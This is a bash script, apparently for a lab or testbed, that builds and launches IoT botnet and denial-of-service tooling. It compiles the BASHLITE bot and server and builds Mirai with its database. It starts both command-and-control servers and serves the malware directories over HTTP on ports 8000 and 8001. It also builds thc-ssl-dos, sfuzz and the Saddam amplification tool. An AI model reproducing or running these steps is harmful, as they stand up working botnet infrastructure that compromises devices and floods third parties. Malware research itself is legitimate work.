#!/bin/bash

export PATH=/usr/local/go/bin:$PATH

#service mysql start
#mysqld 

#############
#   build   #
#############
# bashlite
cd /tools/iot-malware/BASHLITE && gcc client.c --static -DX86_BUIL -o bl_bot
cd /tools/iot-malware/BASHLITE && gcc server.c -o bl_server
# mirai - NOTE setup.py should already be executed
cd /tools/mirai/ && chmod +x build.sh && ./build.sh debug telnet 
cd /tools/mirai/ && chmod +x setup.sh && ./setup.sh 
cd /tools/mirai && cat ./tools/db.sql | mysql
service mysql restart
# sfuzz
cd /tools/sfuzz ; ./configure --cc=gcc --enable-plugin-samples && make
# thc-ssl-dos
cd /tools/thc-ssl-dos && ./configure && make all
# saddam
cd /tools/Saddam-new ; python2.7 -m virtualenv .

############
#    run   #
############
cd /tools/mirai/debug/ && ./cnc &
#cd /tools/mirai/debug/ && ./scanListen &
cd /tools/iot-malware/BASHLITE/ && ./bl_server 6667 2 &

############
#  server  #
############
cd /tools/mirai/debug/ && python3 -m http.server 8000 &
cd /tools/iot-malware/BASHLITE && python3 -m http.server 8001

